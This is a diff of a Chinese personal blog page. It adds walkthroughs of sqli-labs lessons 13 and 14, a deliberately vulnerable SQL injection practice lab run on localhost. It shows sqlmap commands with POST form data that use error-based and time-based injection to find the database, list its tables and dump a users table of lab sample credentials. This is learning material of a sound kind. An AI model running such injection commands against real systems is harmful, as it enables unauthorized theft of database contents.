@@ -36,7 +36,7 @@
         <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
             <span>📅 发布: 2025-12-25</span>
             <span style="margin: 0 15px;">|</span>
-            <span style="color: #007bff; font-weight: bold;">📝 更新: 2026-01-02</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2026-01-03</span>
             
             
              <span style="margin: 0 15px;">|</span>
@@ -405,7 +405,53 @@
 
 
 <hr>
-<h2 id="13："><a href="#13：" class="headerlink" title="#13："></a>#13：</h2><hr>
+<h2 id="13："><a href="#13：" class="headerlink" title="#13："></a>#13：</h2><p><img src="/images/QQ20260103-184518.png" alt="alt text"></p>
+<p>依旧这块，还是一样的，先抓个包看看。</p>
+<p><img src="/images/QQ20260103-184954.png" alt="alt text"></p>
+<p>依旧这块，看来这一题也跟上面几次差不多。</p>
+<p>简单看一下，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-13/&quot; \</span><br><span class="line">--data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; \</span><br><span class="line">--batch</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap回显存在错误注入和时间注入。</p>
+<p>试一下错误注入，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-13/&quot; \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; \</span><br><span class="line">&gt; --technique=E \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --current-db</span><br></pre></td></tr></table></figure>
+
+<p>拿下数据库名-security，而且回显也告诉我们是单引号与括号的组合。</p>
+<p>接下来，直接连招。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-13/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; \</span><br><span class="line">&gt; --technique=E \</span><br><span class="line">&gt; -D security \</span><br><span class="line">&gt; --tables</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-13/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; \</span><br><span class="line">&gt; --technique=E \</span><br><span class="line">&gt; -D security \</span><br><span class="line">&gt; -T users \</span><br><span class="line">&gt; --dump</span><br></pre></td></tr></table></figure>
+
+<p>直接拿下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="14："><a href="#14：" class="headerlink" title="#14："></a>#14：</h2><p><img src="/images/QQ20260103-190732.png" alt="alt text"></p>
+<p>Same。</p>
+<p>抓个包。</p>
+<p><img src="/images/QQ20260103-190839.png" alt="alt text"></p>
+<p>Same。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-14/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot;</span><br></pre></td></tr></table></figure>
+
+<p>直接sqlmap。</p>
+<p>还是显示存在错误注入和时间注入。</p>
+<p>这一次试一试时间。</p>
+<p>ok，跑一会后就直接出来了，security。</p>
+<p>时间注入还真是慢，看来以后，要是有错误注入还是首选错误注入吧。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-14/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; -D security \</span><br><span class="line">&gt; --tables</span><br></pre></td></tr></table></figure>
+
+<p>说实话，其实不用指定方法也可以跑的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://localhost/Less-14/&quot; \</span><br><span class="line">&gt; --batch \</span><br><span class="line">&gt; --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; \</span><br><span class="line">&gt; -D security \</span><br><span class="line">&gt; -T users \</span><br><span class="line">&gt; --dump</span><br></pre></td></tr></table></figure>
+
+<p>直接就拿下了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="15："><a href="#15：" class="headerlink" title="#15："></a>#15：</h2><hr>
 <p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
         </div>
@@ -414,6 +460,6 @@
 
 </div>
 
-<script src="/js/main.js?v=1767350758397"></script>
+<script src="/js/main.js?v=1767439731229"></script>
 </body>
 </html>
